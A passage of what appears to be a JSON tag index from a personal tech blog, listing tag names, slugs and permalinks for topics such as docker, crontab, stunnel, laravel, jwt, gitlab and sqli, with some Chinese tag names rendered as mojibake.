","permalink":"https://ushell.me/tags/%E5%85%B1%E4%BA%AB%E9%94%AE%E9%BC%A0/"},{"name":"docker","slug":"docker","permalink":"https://ushell.me/tags/docker/"},{"name":"crontab","slug":"crontab","permalink":"https://ushell.me/tags/crontab/"},{"name":"debian","slug":"debian","permalink":"https://ushell.me/tags/debian/"},{"name":"ffi","slug":"ffi","permalink":"https://ushell.me/tags/ffi/"},{"name":"ssr","slug":"ssr","permalink":"https://ushell.me/tags/ssr/"},{"name":"spipe","slug":"spipe","permalink":"https://ushell.me/tags/spipe/"},{"name":"hammerspoon","slug":"hammerspoon","permalink":"https://ushell.me/tags/hammerspoon/"},{"name":"è‡ªåŠ¨åŒ–","slug":"è‡ªåŠ¨åŒ–","permalink":"https://ushell.me/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"ldap","slug":"ldap","permalink":"https://ushell.me/tags/ldap/"},{"name":"tls","slug":"tls","permalink":"https://ushell.me/tags/tls/"},{"name":"spiped","slug":"spiped","permalink":"https://ushell.me/tags/spiped/"},{"name":"stunnel","slug":"stunnel","permalink":"https://ushell.me/tags/stunnel/"},{"name":"outline","slug":"outline","permalink":"https://ushell.me/tags/outline/"},{"name":"é…¸é…¸ä¹³","slug":"é…¸é…¸ä¹³","permalink":"https://ushell.me/tags/%E9%85%B8%E9%85%B8%E4%B9%B3/"},{"name":"phpbrew","slug":"phpbrew","permalink":"https://ushell.me/tags/phpbrew/"},{"name":"laradock","slug":"laradock","permalink":"https://ushell.me/tags/laradock/"},{"name":"composer","slug":"composer","permalink":"https://ushell.me/tags/composer/"},{"name":"prestissimo","slug":"prestissimo","permalink":"https://ushell.me/tags/prestissimo/"},{"name":"composer2","slug":"composer2","permalink":"https://ushell.me/tags/composer2/"},{"name":"laravel","slug":"laravel","permalink":"https://ushell.me/tags/laravel/"},{"name":"jwt","slug":"jwt","permalink":"https://ushell.me/tags/jwt/"},{"name":"laravel-permission","slug":"laravel-permission","permalink":"https://ushell.me/tags/laravel-permission/"},{"name":"microtime","slug":"microtime","permalink":"https://ushell.me/tags/microtime/"},{"name":"cas","slug":"cas","permalink":"https://ushell.me/tags/cas/"},{"name":"sso","slug":"sso","permalink":"https://ushell.me/tags/sso/"},{"name":"gitlab","slug":"gitlab","permalink":"https://ushell.me/tags/gitlab/"},{"name":"sqli","slug":"sqli","permalink":"https://ushell.me/tags/sqli/"}]}